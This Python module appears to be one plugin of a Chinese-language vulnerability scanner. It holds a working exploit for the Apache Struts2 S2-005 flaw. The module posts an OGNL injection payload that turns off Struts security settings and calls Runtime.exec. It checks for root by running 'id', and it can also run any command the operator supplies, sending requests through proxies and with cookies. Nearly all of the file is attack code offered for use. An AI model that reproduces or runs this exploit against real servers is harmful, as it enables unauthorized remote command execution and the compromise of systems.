import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random
import hashlib
import urllib
import http.client

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0' #重新定义http版本

cdd=''
http = ''
https = ''
cmd=''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie=None):
    global cdd
    global http, https,cmd
    try:
        proxies = {'http': http,
                   'https': https}
        if cmd!='':
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            logging.captureWarnings(True)
            poc = r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)=&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)=&(%27\u0023_memberAccess.allowStaticMethodAccess\u003dtrue%27)(bla)(bla)=&(%27\u0023mycmd\u003d\%27MDC\%27%27)(bla)(bla)=&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)=&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))=&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))=&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))=&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))=&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)=&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))="
            poc1=poc.replace('MDC',cmd)
            aa = requests.post(url1, data=poc1, headers=headers, proxies=proxies, verify=False, timeout=15,
                               cookies=s_cookie)
            cd = BeautifulSoup(aa.text, 'html.parser')
            cdd = cd.text.strip().strip('\xa0' * 4).replace(' ', '').replace('', '')
            cmd=''
        else:
            logging.captureWarnings(True)
            headers = {
                'Content-Type': "application/x-www-form-urlencoded"}
            poc = r"(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(bla)(bla)=&(%27\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET%27)(kxlzx)(kxlzx)=&(%27\u0023_memberAccess.allowStaticMethodAccess\u003dtrue%27)(bla)(bla)=&(%27\u0023mycmd\u003d\%27id\%27%27)(bla)(bla)=&(%27\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)%27)(bla)(bla)=&(A)((%27\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())%27)(bla))=&(B)((%27\u0023myres\u003dnew\40byte[51020]%27)(bla))=&(C)((%27\u0023mydat.readFully(\u0023myres)%27)(bla))=&(D)((%27\u0023mystr\u003dnew\40java.lang.String(\u0023myres)%27)(bla))=&(%27\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()%27)(bla)(bla)=&(E)((%27\u0023myout.getWriter().println(\u0023mystr)%27)(bla))="
            aa = requests.post(url1, data=poc,proxies=proxies,headers=headers,verify=False, timeout=15,cookies=s_cookie)
            cd = BeautifulSoup(aa.text, 'html.parser')
            ch = cd.text.strip().strip('\xa0' * 4).replace(' ', '').replace('', '')
            if 'groups=0' in aa.text:
                cdd = '[+]漏洞存在\n执行命令：id\n匹配关键词：groups=0'+ch
            else:
                cdd = '[-]漏洞不存在'
    except EnvironmentError as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ S2-005 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)
def cmad(cmd1):
    global cmd
    cmd=cmd1